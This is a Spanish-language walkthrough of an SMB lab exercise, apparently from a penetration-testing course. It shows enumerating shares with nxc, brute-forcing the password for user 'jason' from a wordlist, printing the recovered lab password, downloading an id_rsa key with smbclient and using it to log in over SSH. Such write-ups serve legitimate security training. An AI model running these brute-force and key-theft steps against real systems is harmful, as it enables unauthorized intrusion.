# Common Services - SMB
Nos dan un target y nos plantean las siguientes preguntas: 

-  What is the name of the shared folder with READ permissions?
	
	```bash
	nxc smb $target --shares -u '' -p ''
	```

- What is the password for the username "jason"?
	
	Nos proporcionan una lista de usuarios y contraseñas, por lo que hacemos fuerza bruta con el usuario jason para `smb` con nxc nuevamente: 

	```
	nxc smb $target -u 'jason' -p pws.list
	```

	Este comando no funciona porque no hemos especificado el dominio. Funcionaría cualquiera de estas dos opciones (con alguna herramienta tipo enum4linux podríamos ver que el dominio es `WORKGROUP`): 

	```bash
	 nxc smb $target -u 'jason' -p smb/bruteforce/pws.list --local-auth 
	 nxc smb $target -u 'jason' -p smb/bruteforce/pws.list -d WORKGROUP
	```

	Encontrando como contraseña `34c8zuNBo91!@28Bszh`

-  Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

	En este caso nos podemos conectar a SMB con las credenciales obtenidas

	```bash
	smbclient -U jason //$target/GGJ
	```

	Lo que nos permite descargar un archivo `id_rsa`. Lo descargamos y nos conectamos por ssh 
	
	```
	ssh -i id_rsa jason@$target
	```

	
	